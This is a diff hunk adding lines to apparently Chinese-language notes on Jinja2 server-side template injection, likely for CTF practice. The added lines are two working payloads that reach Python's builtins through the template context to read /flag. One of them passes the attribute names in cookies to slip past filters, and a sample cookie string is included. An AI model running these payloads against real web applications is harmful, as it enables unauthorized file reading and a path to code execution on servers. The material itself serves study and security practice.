@@ -304,6 +304,15 @@ os._wrap_close 类里有popen
 
 ```
 
+```
+# request.cookie
+{{self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&#34;/flag&#34;).read()}}
+
+{{self[request.cookies.di][request.cookies.temp][request.cookies.lip][request.cookies.glo][request.cookies.bui].open(request.cookies.cmd).read()}}
+ 
+cookie:di=__dict__;temp=_TemplateReference__context;lip=lipsum;glo=__globals__;bui=__builtins__;cmd=flag
+```
+
 
 
 ## 漏洞挖掘
